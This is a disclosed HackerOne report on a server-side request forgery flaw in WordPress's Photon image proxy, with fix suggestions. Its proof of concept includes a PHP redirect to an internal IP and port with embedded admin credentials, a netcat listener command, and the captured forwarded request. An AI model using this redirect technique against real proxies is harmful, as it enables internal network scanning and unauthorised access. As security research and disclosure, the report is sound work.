# Infrastructure - Photon - SSRF

## Report Details
- **Report ID**: 204513
- **URL**: https://hackerone.com/reports/204513
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-02-08T10:06:44.378Z
- **Disclosed**: 2017-07-17T23:50:14.884Z

## Reporter
- **Username**: skansing
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
Description
------------------------
The service Photon located at `http://i0.wp.com/` and described at `https://code.trac.wordpress.org/browser/photon/` is vulnerable to Http SSRF via. redirect.

The redirect can go to any IP (including inside of any firewall photon might be inside) any port and can add auth headers.

The service does try to protect itself against this type of attack by using
```
// https://code.trac.wordpress.org/browser/photon/index.php#L111
curl_setopt( $ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );
```
But this does not guard against internal IP's, auth redirects nor other port attacks via http/https.

Due to the different responses an attacker can use the service to scan and attack IP ranges for http services, do malicious actions and etc. 

POC
-----------------------------------
**First a demo that the service does not allow firing requests to any port.**

*Note you can bust the cache by changing the params given to Photon, so if no response is given, just bump n+1 on resize param or add a new param*

- Goto `http://i0.wp.com/159.203.190.123:666/new.php?resize=0,1`
- The responds `Sorry, the parameters you provided were not valid`

This protection happens because of the filter validation

```
// https://code.trac.wordpress.org/browser/photon/index.php#L142
if ( isset( $_GET['q'] ) ) {
        if ( $origin_domain_exception & PHOTON__ALLOW_QUERY_STRINGS ) {
                $url .= '?' . preg_replace( '/#.*$/', '', (string) $_GET['q'] );
                unset( $_GET['q'] );
        } else {
                httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );
        }
}
	
if ( false === filter_var( $url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED ) )
        httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );
```


**Now a demo of bypassing the port restriction and appending authorization headers.**
- Goto `http://i0.wp.com/159.203.190.123/new.php?resize=0,2`
- The server gets a incoming request and responds with a 302
`192.0.102.120 - - [08/Feb/2017:04:15:44 -0500] "GET /new.php HTTP/1.1" 302 199 "-" "Photon/1.0"`
- Photon blindly follow the redirect, here is the output of a netcat listening in with the following command. `nc -l -p 666` and the Photon coming in

```
GET / HTTP/1.1
Host: 159.203.190.123:666
Authorization: Basic YWRtaW46YWRtaW4=
User-Agent: Photon/1.0
Accept: */*
```
The contents of `new.php` 
```
<?php
header('Location: http://admin:admin@159.203.190.123:666');
```


Possible Fixes
-----------------------
The side effects of the SSRF is => redirect to any IP, to any port, auth headers.

I have seached for a way to configure these things in cURL but without success.
I would recommend doing 1 request at a time, manually parsing the response and initiating a new request if the validates for such criteria.

Also consider using `curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, TRUE );` atm. the link is vuln to MITM attack as the certs are not verified.  

 

## Attachments
No attachments
